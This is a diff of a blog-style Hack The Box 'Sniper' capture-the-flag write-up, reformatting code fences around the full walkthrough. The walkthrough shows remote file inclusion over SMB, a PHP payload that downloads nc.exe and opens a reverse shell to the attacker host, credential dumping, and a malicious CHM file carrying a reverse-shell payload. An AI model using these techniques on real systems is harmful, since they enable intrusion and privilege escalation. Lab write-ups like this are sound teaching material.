@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Sniper"
-date:   2020-03-29 15:00:00 +0800
-categories: hackthebox
-tags: php smb chm windows
+title: Hack The Box - Sniper
+date: 2020-03-29 15:00:00 +0800
+categories: [hackthebox]
+tags: [php, smb, chm, windows]
 ---
 
 ![](/assets/images/sniper.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.151 sniper.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC sniper.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 11:11 EDT
 Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
@@ -51,7 +50,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 94.42 seconds
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -100,30 +99,30 @@ That was when I was thinking: hmm... this is a Windows box right? What happens i
 Lets test out this theory.
 
 First, I create a new folder on my Desktop:
-{% highlight bash %}
+```bash
 $ mkdir ~/Desktop/fileshare
-{% endhighlight %}
+```
 
 And then configured my `Samba` config to create a new `SMB` share called `public`:
-{% highlight bash %}
+```bash
 $ cat /etc/samba/smb.conf
 ...
 [public]:
 	force user = nobody
 	path = /root/Desktop/fileshare
 	public = yes
-{% endhighlight %}
+```
 
 With that done, I create a `.php` file in it :
-{% highlight bash %}
+```bash
 $ cat /root/Desktop/fileshare/phpinfo.php
 <?php phpinfo(); ?>
-{% endhighlight %}
+```
 
 And start my `smbd` service:
-{% highlight bash %}
+```bash
 $ systemctl start smbd
-{% endhighlight %}
+```
 
 Now if we browse to `/blog/?lang=\\10.10.XX.XX\public\phpinfo.php`:
 
@@ -134,15 +133,15 @@ We have successfully upgraded from LFI to remote file inclusion (RFI) :)
 Nows lets try to establish a reverse shell back to us. Since `PHP` reverse shells are sometimes a little wonky , I'm going to upload a `nc.exe` and use it to connecting back to our listener.
 
 Starting a webserver:
-{% highlight bash %}
+```bash
 $ mkdir ~/Desktop/web
 $ cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web
 $ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-{% endhighlight %}
+```
 
 Creating a `.php` file to download `nc.exe` and connect back to us:
-{% highlight bash %}
+```bash
 $ cat /root/Desktop/fileshare/rev.php
 <?php
 # Create a temp dir
@@ -152,20 +151,20 @@ system("curl http://10.10.XX.XX/nc.exe > C:\\tmp\\nc.exe");
 # Establish reverse shell
 system("C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337");
 ?>
-{% endhighlight %}
+```
 
 Starting our listener:
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 Triggering our `.php` script and getting a shell:
-{% highlight bash %}
+```bash
 $ curl 'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\shell.php'
-{% endhighlight %}
+```
 
-{% highlight raw %}
+```
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 50128
 Microsoft Windows [Version 10.0.17763.678]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -173,12 +172,12 @@ Microsoft Windows [Version 10.0.17763.678]
 C:\inetpub\wwwroot\blog>whoami
 whoami
 nt authority\iusr
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 Listing local users:
-{% highlight raw %}
+```
 C:\inetpub\wwwroot\blog>net users
 net users
 
@@ -188,12 +187,12 @@ User accounts for \\
 Administrator            Chris                    DefaultAccount           
 Guest                    WDAGUtilityAccount       
 The command completed with one or more errors.
-{% endhighlight %}
+```
 
 Seems like the `user.txt` is residing in `Chris` but we do not know his credentials.
 
 Looking around, I found MySQL credentials in `C:\inetpub\wwwroot\users`:
-{% highlight raw %}
+```
 C:\inetpub\wwwroot\user>type db.php
 type db.php
 <?php
@@ -206,10 +205,10 @@ if (mysqli_connect_errno())
   echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
 ?>
-{% endhighlight %}
+```
 
 and also saw how the `login` feature for the website was implemented:
-{% highlight raw %}
+```
 <?php
 require('db.php');
 session_start();
@@ -232,12 +231,12 @@ and password='".md5($password)."'";
             header("Location: index.php");
          }else{
 ...
-{% endhighlight %}
+```
 
 From this, we can tell that some possible usernames and passwords are stored in the `users` table in the columns `username` and `password` so lets try to dump them out:
 
 Creating a `.php` file to dump out the `users` table:
-{% highlight bash %}
+```bash
 $ cat ~/Desktop/fileshare/dump.php
 <?php
 $conn = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
@@ -258,10 +257,10 @@ if (mysqli_num_rows($result) > 0) {
 }
 mysqli_close($conn);
 ?>
-{% endhighlight %}
+```
 
 Viewing the results:
-{% highlight bash %}
+```bash
 $ curl 'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\dump.php'
 ...
 Array
@@ -273,12 +272,12 @@ Array
     [trn_date] => 2019-04-11 22:45:36
 )
 ...
-{% endhighlight %}
+```
 
 Putting the hash into Google (Yes Google), turns out it was the MD5 hash of `$uperpassw0rd`.
 
 Using `smbmap`, I decided to manually test possible pairs of credentials since the password list was short:
-{% highlight bash %}
+```bash
 smbmap -H sniper.htb -u Chris -p "$uperpassw0rd"
 [+] Finding open SMB ports....
 [!] Authentication error on sniper.htb
@@ -293,12 +292,12 @@ root@kali:~/Desktop# smbmap -H sniper.htb -u Chris -p 36mEAhz/B8xQ~2VM
         C$                                                      NO ACCESS       Default share
 		...
         IPC$                                                    READ ONLY       Remote IPC
-{% endhighlight %}
+```
 
 Alright, we got Chris's credentials. To login into `Chris`, we will need to do something like a `su` or `sudo` in Linux but for Windows! In Powershell, there is a cmdlet called [`Invoke-Command`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7) which allows you to specify who to run as using `-Credential` or `-Session`.
 
 Testing `Invoke-Command`:
-{% highlight raw %}
+```
 C:\inetpub\wwwroot\blog>powershell
 powershell
 Windows PowerShell 
@@ -308,24 +307,24 @@ PS C:\inetpub\wwwroot\blog> $Cred = New-Object System.Management.Automation.PSCr
 PS C:\inetpub\wwwroot\blog> $TestPCSession = New-PSSession -Credential $Cred
 PS C:\inetpub\wwwroot\blog> Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami}
 sniper\chris
-{% endhighlight %}
+```
 
 It works! We were able to run commands as `chris`! Now lets try to establish another reverse shell as `chris`.
 
 # user.txt
 
 Starting our listener:
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 And running `nc.exe` to connect back to us:
-{% highlight raw %}
+```
 PS C:\inetpub\wwwroot\blog> Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c C:\tmp\nc.exe -e cmd.exe 10.10.XX 1337}
-{% endhighlight %}
+```
 
-{% highlight raw %}
+```
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49687
 Microsoft Windows [Version 10.0.17763.678]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -336,13 +335,13 @@ sniper\chris
 C:\Users\Chris\Documents>type C:\Users\Chris\Desktop\user.txt
 type C:\Users\Chris\Desktop\user.txt
 21f4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 Looking around, I found a file in `chris`'s download folder:
 
-{% highlight raw %}
+```
 C:\Users\Chris\Downloads>dir
 dir
  Volume in drive C has no label.
@@ -355,27 +354,27 @@ dir
 04/11/2019  08:36 AM            10,462 instructions.chm
                1 File(s)         10,462 bytes
                2 Dir(s)  17,988,661,248 bytes free
-{% endhighlight %}
+```
 
 Using `nc.exe`, I downloaded the `instructions.chm` file and opened it in a Windows VM.
 
 Starting our listener:
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337 > instructions.chm
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 Sending the file over:
-{% highlight raw %}
+```
 C:\Users\Chris\Downloads>C:\tmp\nc.exe 10.10.XX.XX 1337 < instructions.chm
-{% endhighlight %}
+```
 
 ![](/assets/images/sniper9.png) 
 
 Looks like we have a disgrunted employee here haha but nothing much here.
 
 I also found a folder called `C:\Docs`:
-{% highlight raw %}
+```
 C:\Docs>dir
 dir
  Volume in drive C has no label.
@@ -389,20 +388,20 @@ dir
 04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
                2 File(s)        552,892 bytes
                2 Dir(s)  17,993,322,496 bytes free
-{% endhighlight %}
+```
 
 In the `note.txt`:
-{% highlight raw %}
+```
 Hi Chris,
 Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
 
 Regards,
 Sniper CEO.
-{% endhighlight %}
+```
 
 Wow what a tough boss... Hmm... Could the `instructions.chm` be the documentation that the boss is talking about? If we try copying the `instructions.chm` to `C:\Docs`:
 
-{% highlight raw %}
+```
 C:\Docs>copy C:\Users\Chris\Downloads\instructions.chm . 
 copy C:\Users\Chris\Downloads\instructions.chm . 
         1 file(s) copied.
@@ -421,10 +420,10 @@ dir
 04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
                3 File(s)        563,354 bytes
                2 Dir(s)  17,974,849,536 bytes free
-{% endhighlight %}
+```
 
 And after a while, it disappeared!
-{% highlight raw %}
+```
 C:\Docs>dir
 dir
  Volume in drive C has no label.
@@ -438,7 +437,7 @@ dir
 04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
                2 File(s)        552,892 bytes
                2 Dir(s)  17,974,861,824 bytes free
-{% endhighlight %}
+```
 
 It is possible that the CEO is retrieving the file and opening it. Using `nishang`'s [`Out-CHM.ps1`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1), we can actually generate a malicious `.chm` that run arbitrary commands.
 
@@ -450,7 +449,7 @@ First we will need to install [`HTML Help Workshop`](https://www.microsoft.com/e
 
 After some testing on my local machines, I managed to generate the correct `.chm` file:
 
-{% highlight powershell %}
+```powershell
 PS C:\Users\rizemon\Desktop> Import-Module .\Out-CHM.ps1
 PS C:\Users\rizemon\Desktop> Out-CHM -Payload "C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
 Microsoft HTML Help Compiler 4.74.8702
@@ -467,28 +466,28 @@ Compile time: 0 minutes, 0 seconds
 
 Created c:\Users\rizemon\Desktop\doc.chm, 13,438 bytes
 Compression increased file by 142 bytes.
-{% endhighlight %}
+```
 
 After transfering the `doc.chm` to my Kali's web server directory, I uploaded it to `C:\Docs` as `instructions.chm`.
 
-{% highlight raw %}
+```
 C:\Docs>curl http://10.10.XX.XX/doc.chm > instructions.chm
 curl http://10.10.XX.XX/doc.chm > instructions.chm
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 13436  100 13436    0     0  13436      0  0:00:01 --:--:--  0:00:01 18687
-{% endhighlight %}
+```
 
 And started our listener:
 
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 After a while, the `instructions.chm` disappeared and look at what we got on our listener!
 
-{% highlight raw %}
+```
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49709
 Microsoft Windows [Version 10.0.17763.678]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -500,6 +499,6 @@ sniper\administrator
 C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 5624XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
